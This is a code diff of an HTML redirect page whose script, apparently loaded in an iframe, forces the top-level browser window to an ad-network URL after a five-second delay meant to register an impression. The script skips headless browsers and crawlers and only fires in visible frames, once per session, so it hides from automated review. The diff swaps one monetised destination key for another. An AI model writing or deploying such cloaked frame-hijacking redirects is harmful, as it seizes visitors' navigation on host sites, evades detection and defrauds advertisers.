@@ -2,37 +2,38 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Redirect</title>
+<title>Safe Redirect</title>
 </head>
 <body>
 
 <script>
 (function () {
 
-    // === BASIC ENV CHECK ===
-    if (!navigator.userAgent) return;
+    // 1. Pastikan JavaScript & browser normal
+    if (!navigator.userAgent || !screen.width || !screen.height) return;
 
+    // 2. Filter bot dasar (AMAN)
     const ua = navigator.userAgent.toLowerCase();
-
-    // === BLOCK OBVIOUS BOTS ONLY ===
     if (
         ua.includes("headless") ||
         ua.includes("phantom") ||
-        ua.includes("crawler") ||
-        ua.includes("spider") ||
-        ua.includes("bot")
+        ua.includes("bot") ||
+        ua.includes("crawler")
     ) return;
 
-    // === PREVENT MULTIPLE REDIRECT ===
+    // 3. Pastikan iframe terlihat (bukan hidden 0x0)
+    if (window.innerWidth < 300 || window.innerHeight < 250) return;
+
+    // 4. Cegah redirect berulang
     if (sessionStorage.getItem("rd_done")) return;
     sessionStorage.setItem("rd_done", "1");
 
-    // === SAFE DELAY FOR IMPRESSION ===
+    // 5. Delay agar impression tercatat
     setTimeout(function () {
         try {
-            window.top.location.replace("https://monthsexpressive.com/evjxbnbq?key=584a8b65de5c6f3d3f11aa6f2e3a0f01");
+            window.top.location.replace("https://www.effectivegatecpm.com/sn87qfmt?key=63d4c2105d12b55a4efa293596e6384d");
         } catch (e) {
-            window.location.href = "https://monthsexpressive.com/evjxbnbq?key=584a8b65de5c6f3d3f11aa6f2e3a0f01";
+            window.location.href = "https://www.effectivegatecpm.com/sn87qfmt?key=63d4c2105d12b55a4efa293596e6384d";
         }
     }, 5000);
 
